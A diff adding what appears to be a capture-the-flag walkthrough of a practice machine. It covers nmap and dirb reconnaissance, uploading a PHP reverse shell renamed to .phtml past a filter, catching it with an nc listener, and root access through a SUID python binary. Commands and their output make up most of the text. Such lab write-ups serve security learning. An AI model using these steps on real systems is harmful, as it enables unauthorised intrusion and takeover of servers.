@@ -1,0 +1,162 @@
+1) Reconnaisance 
+ tool : nmap 
+  command : sudo nmap -A -T5 $IP
+Output
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-06 17:05 IST
+Nmap scan report for 10.10.15.79
+Host is up (0.20s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
+|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
+|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: HackIT - Home
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 42.21 seconds
+
+
+b) exploring port 80
+   Nothing much
+
+2) Finding hidden directories
+   tool Used : dirb
+   dirb http://$IP
+Output:
+---- Scanning URL: http://10.10.15.79/ ----
+==> DIRECTORY: http://10.10.15.79/css/                                                                                         
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      + http://10.10.15.79/index.php (CODE:200|SIZE:616)
+                                                                                                                                                                                              ==> DIRECTORY: http://10.10.15.79/js/                                                                                          
+==> DIRECTORY: http://10.10.15.79/panel/    
+
+3) Gaining access 
+
+We know from the above summary that page is vulnerable to remote code exexution 
+We will upload reverse shell py pentestmonkey
+  Starting a netcat listener at port 1234
+  nc -nlvp 1234
+
+Changing Ip to tun0 and port to 1234 into Php reverse shell code obtain server's shell
+
+┌──(kali㉿kali)-[~/Desktop/thm]
+└─$ nc -nlvp 1234                                                                  
+listening on [any] 1234 ...
+
+Our php shell fails but no worries we can try with changing  extension of the shell 
+.phtml or php5 etc . Let's see
+
+.phtml uploads success fully
+
+
+Output
+┌──(kali㉿kali)-[~]
+└─$ nc -nlvp 1234
+listening on [any] 1234 ...
+connect to [10.8.131.147] from (UNKNOWN) [10.10.15.79] 59146
+Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 12:07:30 up 34 min,  0 users,  load average: 0.00, 0.00, 0.14
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+
+BAM !!! i AM INTO THEIR SERVER NOW 
+
+
+5)Privelige escalation
+$ python -c 'import pty ; pty.spawn("bin/bash")'    
+bash-4.4$ 
+(Making shell interactive)
+
+I will be finding user.txt
+
+Basic command : find / -type f -name user.txt
+find: '/proc/1511/ns': Permission denied
+/var/www/user.txt
+find: '/var/spool/rsyslog': Permission denied
+find: '/var/spool/cron/atjobs': Permission denied
+find: '/var/spool/cron/crontabs': Permission denied
+find: '/var/spool/cron/atspool': Permission denied
+
+Read user.txt (cat command)
+
+Let's check suid bits in order to get root
+bash-4.4$ find / -perm -u=s -type f 2>/dev/null
+usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/bin/traceroute6.iputils
+/usr/bin/newuidmap
+/usr/bin/newgidmap
+/usr/bin/chsh
+/usr/bin/python  <--I find it weird in suid's
+/usr/bin/at
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/pkexec
+/snap/core/8268/bin/mount
+/snap/core/8268/bin/ping
+/snap/core/8268/bin/ping6
+/snap/core/8268/bin/su
+/snap/core/8268/bin/umount
+/snap/core/8268/usr/bin/chfn
+
+Now Our Final command for getting root
+
+Now we'll Spawn root shell using
+python -c 'import os ; os.execl("/bin/sh", "sh" , "-p")'
+Let's do it
+bash-4.4$ python -c 'import os ; os.execl("/bin/sh", "sh" , "-p")'
+python -c 'import os ; os.execl("/bin/sh", "sh" , "-p")'
+# whoami
+whoami
+root
+# cd /root
+cd /root
+# ls
+ls
+root.txt
+# cat root.txt
+cat root.txt
+
+<MACHINE HACKED>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
